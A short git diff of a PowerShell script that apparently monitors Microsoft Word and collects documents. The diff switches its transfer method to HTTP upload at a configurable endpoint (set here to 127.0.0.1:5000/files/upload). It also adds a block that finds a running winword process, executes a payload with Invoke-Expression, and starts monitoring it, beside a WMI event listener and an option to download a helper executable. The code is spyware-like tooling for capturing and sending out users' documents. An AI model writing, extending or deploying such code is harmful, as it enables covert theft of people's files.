@@ -6,8 +6,8 @@ param (
     $global:LiveModeInterval = 5, # Every x seconds to sync data, only in live mode
     $global:WordFileExtentions =@('docx','txt'),
 
-    $global:CommunicationMethod = "smb", # smb / remote transfer
-    $global:Remote = 'c:\temp\', # Only when using remote transfer
+    $global:CommunicationMethod = "remote", # smb / remote transfer
+    $global:Remote = 'http://127.0.0.1:5000/files/upload', # Only when using remote transfer
 
     $global:HandelsMethod = "code", # handels / openfiles / code
     $global:HandlesExeMethod = "remote", # To download on scripts load or to use base64 local
@@ -88,6 +88,15 @@ function lolololol{
             Invoke-Expression $Payload
             Start-Mon -ProcID $e.ProcessID
         }
+    }
+
+    try {
+        $proc = Get-Process -Name "winword"
+        Invoke-Expression $Payload
+        Start-Mon -ProcID $proc.Id
+    }
+    catch {
+        Send-Log -LogString "No running winword, starting listener"
     }
 
     Register-WMIEvent -Query $Query -SourceIdentifier $Identifier -Action $ActionBlock 
